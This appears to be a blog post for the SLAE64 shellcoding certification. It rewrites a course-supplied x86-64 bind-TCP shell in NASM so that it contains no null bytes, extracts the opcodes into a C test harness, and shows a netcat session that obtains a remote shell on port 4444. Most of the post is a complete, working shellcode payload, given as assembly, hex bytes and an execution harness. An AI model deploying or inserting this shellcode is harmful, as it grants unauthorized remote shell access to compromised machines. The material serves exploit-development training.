---
title: SLAE64 - Assignment 1B - Null-Free Bind TCP Shellcode 
author: fwinsnes
date: 2021-01-21 13:44:00 +0800
categories: [SLAE64]
tags: [assembly, shellcoding]
---

#### Introduction

These series of posts starting with the prefix "SLAE64 - Assignment" will be created in order to fulfill the requirements of the SLAE64 certification.

A Bind shell is a form of malware which grants remote access to a system through a shell. However, it differentiates from its peer the Reverse Shell, binding to a local port of 
the compromised system, instead of arranging a specific connection on a trivial address. Furthermore, after the connection is established, a shell is executed, granting 
interaction to the attacker.

The first assignment from the seven is divided in two sections:

+ A: Requires the creation of a Bind Shell with password protection through the Assembly language, and converting such into shellcode. 
+ B: Requires the alteration of the provided Bind Shell during the course, in order that it no longer possesses any form of NULL bytes (00). 

Due to the reason that in the [previous](https://whitecr0wz.github.io/posts/SLAE64-Bind-Password/) post the first section of the exercise was tackled, this post will be focused 
towards the secondary task.

Let's analyze the Bind Shell given during the course:

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_1/B/og$ objdump -D 1.o -M intel

1.o:     file format elf64-x86-64                                                                                                                                                 

Disassembly of section .text:


0000000000000000 <_start>:
   0:   b8 29 00 00 00          mov    eax,0x29
   5:   bf 02 00 00 00          mov    edi,0x2
   a:   be 01 00 00 00          mov    esi,0x1
   f:   ba 00 00 00 00          mov    edx,0x0
  14:   0f 05                   syscall 
  16:   48 89 c7                mov    rdi,rax
  19:   48 31 c0                xor    rax,rax
  1c:   50                      push   rax
  1d:   89 44 24 fc             mov    DWORD PTR [rsp-0x4],eax
  21:   66 c7 44 24 fa 11 5c    mov    WORD PTR [rsp-0x6],0x5c11
  28:   66 c7 44 24 f8 02 00    mov    WORD PTR [rsp-0x8],0x2
  2f:   48 83 ec 08             sub    rsp,0x8
  33:   b8 31 00 00 00          mov    eax,0x31
  38:   48 89 e6                mov    rsi,rsp
  3b:   ba 10 00 00 00          mov    edx,0x10
  40:   0f 05                   syscall 
  42:   b8 32 00 00 00          mov    eax,0x32
  47:   be 02 00 00 00          mov    esi,0x2
  4c:   0f 05                   syscall 
  4e:   b8 2b 00 00 00          mov    eax,0x2b
  53:   48 83 ec 10             sub    rsp,0x10
  57:   48 89 e6                mov    rsi,rsp
  5a:   c6 44 24 ff 10          mov    BYTE PTR [rsp-0x1],0x10
  5f:   48 83 ec 01             sub    rsp,0x1
  63:   48 89 e2                mov    rdx,rsp
  66:   0f 05                   syscall 
  68:   49 89 c1                mov    r9,rax
  6b:   b8 03 00 00 00          mov    eax,0x3
  70:   0f 05                   syscall 
  72:   4c 89 cf                mov    rdi,r9
  75:   b8 21 00 00 00          mov    eax,0x21
  7a:   be 00 00 00 00          mov    esi,0x0
  7f:   0f 05                   syscall 
  81:   b8 21 00 00 00          mov    eax,0x21
  86:   be 01 00 00 00          mov    esi,0x1
  8b:   0f 05                   syscall 
  8d:   b8 21 00 00 00          mov    eax,0x21
  92:   be 02 00 00 00          mov    esi,0x2
  97:   0f 05                   syscall 
  99:   48 31 c0                xor    rax,rax
  9c:   50                      push   rax
  9d:   48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
  a4:   2f 73 68 
  a7:   53                      push   rbx
  a8:   48 89 e7                mov    rdi,rsp
  ab:   50                      push   rax
  ac:   48 89 e2                mov    rdx,rsp
  af:   57                      push   rdi
  b0:   48 89 e6                mov    rsi,rsp
  b3:   48 83 c0 3b             add    rax,0x3b
  b7:   0f 05                   syscall
```

It seems as this assembly program has a great quantity of null opcodes. Nonetheless, if we pay close attention, we might notice that most of these come from mov instructions. 
For instance, when a single byte such as 1 is being inserted into a 64-bit register such as RAX, a lot of nulls will be parsed as well. This could easily be circumvented by 
pushing such bytes as WORDs and then saving such values in Lower 16 bit registers such as ax, bx, dx, bp, and so forth. 

Other techniques could simply implement using a lower bit register such as lower 8-bits instead of 64-bits when it comes to small operations. 

Final code:

```term
global _start


_start:

        ; sock = socket(AF_INET, SOCK_STREAM, 0)
        ; AF_INET = 2
        ; SOCK_STREAM = 1
        ; syscall number 41

        xor rax, rax
        xor rdi, rdi
        xor rsi, rsi

        mov al, 41

        inc rdi
        inc rdi

        inc rsi

        xor rdx, rdx

        syscall

        ; copy socket descriptor to rdi for future use

        mov rdi, rax


        ; server.sin_family = AF_INET
        ; server.sin_port = htons(PORT)
        ; server.sin_addr.s_addr = INADDR_ANY
        ; bzero(&server.sin_zero, 8)

        xor rax, rax

        push rax

        xor rbp, rbp

        push word 2
        pop bp

        mov dword [rsp-4], eax
        mov word [rsp-6], 0x5c11
        mov word [rsp-8], bp
        sub rsp, 8


        ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
        ; syscall number 49

        mov al, 49

        mov rsi, rsp
        mov dl, 16
        syscall
               ; listen(sock, MAX_CLIENTS)
        ; syscall number 50

        push word 2
        pop bp

        mov al, 50
        mov rsi, rbp
        syscall


        ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
        ; syscall number 43


        mov al, 43
        sub rsp, 16
        mov rsi, rsp
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp

        syscall

        ; store the client socket description
        mov r9, rax

        ; close parent

        mov al, 3
        syscall

        ; duplicate sockets

        ; dup2 (new, old)
        mov rdi, r9
        mov al, 33

        xor rsi, rsi

        syscall

        mov al, 33

        push word 1
        pop bp

        mov rsi, rbp
        syscall

        mov al, 33

        push word 2
        pop bp

        mov rsi, rbp

        syscall

        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
```

Let's assemble, link this and get its shellcode!

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_1/B$ nasm -f elf64 1.asm -o 1.o && ld 1.o -o 1 && for i in $(objdump -d 1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; 
done;echo
```

C format:

```term
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\xb0\x29\x48\xff\xc7\x48\xff\xc7\x48\xff\xc6\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x48\x31\xed\x66\x6a\x02\x66\x5d\x89\x44\x24\xfc
\x66\xc7\x44\x24\xfa\x11\x5c\x66\x89\x6c\x24\xf8\x48\x83\xec\x08\xb0\x31\x48\x89\xe6\xb2\x10\x0f\x05\x66\x6a\x02\x66\x5d\xb0\x32\x48\x89\xee\x0f\x05\xb0\x2b\x48\x83\xec\x10\x48\
x89\xe6\xc6\x44\x24\xff\x10\x48\x83\xec\x01\x48\x89\xe2\x0f\x05\x49\x89\xc1\xb0\x03\x0f\x05\x4c\x89\xcf\xb0\x21\x48\x31\xf6\x0f\x05\xb0\x21\x66\x6a\x01\x66\x5d\x48\x89\xee\x0f\x
05\xb0\x21\x66\x6a\x02\x66\x5d\x48\x89\xee\x0f\x05\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x0
5"

;

main()
{
 
printf("Shellcode Length:  %d\n", (int)strlen(code));
 
int (*ret)() = (int(*)())code;
 
ret();
 
}
```

#### EndGame

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_1/B$ gcc null-free.c -o null-free -fno-stack-protector -z execstack -w 
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_1/B$ ./null-free 
Shellcode Length:  177
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@whitecr0wz:~# rlwrap nc 192.168.100.205 4444 -v 
192.168.100.205: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.100.205] 4444 (?) open
python3 -c 'import pty;pty.spawn("/bin/bash")'
whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_1/B$ id 
id 
uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_1/B$ 
```

### Code

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE64–27812/PA-27812

You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/SLAE64/Assignment_1/B).
